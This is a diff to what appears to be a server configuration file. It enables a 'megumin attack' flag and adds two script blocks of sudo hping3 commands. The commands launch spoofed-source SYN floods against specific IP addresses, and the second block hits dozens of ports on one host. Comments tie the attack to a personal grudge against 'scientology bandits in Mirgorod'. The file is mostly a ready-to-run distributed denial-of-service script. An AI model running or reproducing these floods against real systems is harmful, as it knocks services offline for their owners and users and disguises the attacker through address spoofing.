@@ -70,3 +70,99 @@ server_logrotate_conf:
       - "endscript"
 
 server_megumin_attack: true
+script_content: |
+          #!/usr/bin/env bash
+          # https
+          sudo hping3 -a 190.0.175.180 185.71.67.220 -S -d 120 --flood -p 443 -0 &
+          sudo hping3 -a 190.0.175.115 185.71.67.220 -S -d 120 --flood -p 443 -0 &
+          sudo hping3 -a 190.0.175.111 185.71.67.220 -S -d 120 --flood -p 443 -0 &
+          sudo hping3 -a 190.0.175.140 185.71.67.220 -S -d 120 --flood -p 443 -1 &
+          sudo hping3 -a 190.0.175.123 185.71.67.220 -S -d 120 --flood -p 443 -1 &
+          sudo hping3 -a 190.0.175.163 185.71.67.220 -S -d 120 --flood -p 443 -1 &
+
+          # http
+          # sudo hping3 -a 190.0.175.180 195.64.183.233 -S -d 120 --flood -p 53 -0 &
+          # sudo hping3 -a 190.0.175.115 195.64.183.233 -S -d 120 --flood -p 53 -0 &
+          # sudo hping3 -a 190.0.175.111 195.64.183.233 -S -d 120 --flood -p 53 -0 &
+          # sudo hping3 -a 190.0.175.140 195.64.183.233 -S -d 120 --flood -p 53 -1 &
+          # sudo hping3 -a 190.0.175.123 195.64.183.233 -S -d 120 --flood -p 53 -1 &
+          # sudo hping3 -a 190.0.175.163 195.64.183.233 -S -d 120 --flood -p 53 -1 &
+
+script_content_sci: |
+          # possible, to all ports on server. human trafficking.
+          # Yep, I win while scientology bandits in Mirgorod try to find way to my house. 
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 43 -1 &    
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 80 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 83 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 84 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 85 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 89 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 110 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 143 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 443 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 465 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 587 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 700 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 993 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 995 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 1084 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 1085 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 1089 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 1443 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 1935 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 3389 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 5222 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 5432 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 5900 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 5901 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 5999 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 8080 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 8081 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 8085 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 8086 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 8088 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 8089 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 8090 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 8099 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 9100 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 9200  -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 20000 -1 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 30000 -1 &
+
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 43 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 80 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 83 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 84 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 85 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 89 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 110 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 143 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 443 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 465 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 587 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 700 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 993 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 995 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 1084 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 1085 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 1089 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 1443 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 1935 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 3389 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 5222 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 5432 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 5900 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 5901 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 5999 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 8080 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 8081 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 8085 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 8086 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 8088 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 8089 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 8090 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 8099 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 9100 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 9200  -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 20000 -0 &
+          sudo hping3 -a 190.0.175.134 35.190.56.182 -S -d 120 --flood -p 30000 -0 &
